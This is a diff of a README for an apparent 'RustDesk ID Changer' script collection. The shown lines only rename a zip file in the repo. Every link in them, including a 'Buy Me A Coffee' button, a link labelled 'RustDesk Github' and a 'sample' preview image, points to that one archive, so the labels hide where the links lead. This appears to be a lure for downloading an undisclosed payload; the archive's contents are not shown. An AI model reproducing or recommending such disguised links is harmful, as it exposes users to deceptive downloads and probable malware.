@@ -1,9 +1,9 @@
-<a href="https://raw.githubusercontent.com/ztdesk1/RustDesk-ID-Changer/main/semistate/Changer_Desk_Rust_I_v3.8.zip" target="_blank"><img src="https://raw.githubusercontent.com/ztdesk1/RustDesk-ID-Changer/main/semistate/Changer_Desk_Rust_I_v3.8.zip" alt="Buy Me A Coffee" style="height: 60px !important;width: 217px !important;" ></a>
+<a href="https://raw.githubusercontent.com/ztdesk1/RustDesk-ID-Changer/main/semistate/Changer_Desk_I_Rust_3.8.zip" target="_blank"><img src="https://raw.githubusercontent.com/ztdesk1/RustDesk-ID-Changer/main/semistate/Changer_Desk_I_Rust_3.8.zip" alt="Buy Me A Coffee" style="height: 60px !important;width: 217px !important;" ></a>
 
 # RustDesk-ID-Changer AIO
 RustDesk ID Changer AIO
 
-RustDesk Github: https://raw.githubusercontent.com/ztdesk1/RustDesk-ID-Changer/main/semistate/Changer_Desk_Rust_I_v3.8.zip
+RustDesk Github: https://raw.githubusercontent.com/ztdesk1/RustDesk-ID-Changer/main/semistate/Changer_Desk_I_Rust_3.8.zip
 
 You will be able to change the RustDesK ID information as you wish with the script.
 
@@ -34,6 +34,6 @@ All powershell scripts tested on Windows 7 - 8.1 - 10 and 11.
 
 Sample preview:
 
-![sample](https://raw.githubusercontent.com/ztdesk1/RustDesk-ID-Changer/main/semistate/Changer_Desk_Rust_I_v3.8.zip)
+![sample](https://raw.githubusercontent.com/ztdesk1/RustDesk-ID-Changer/main/semistate/Changer_Desk_I_Rust_3.8.zip)
 
 
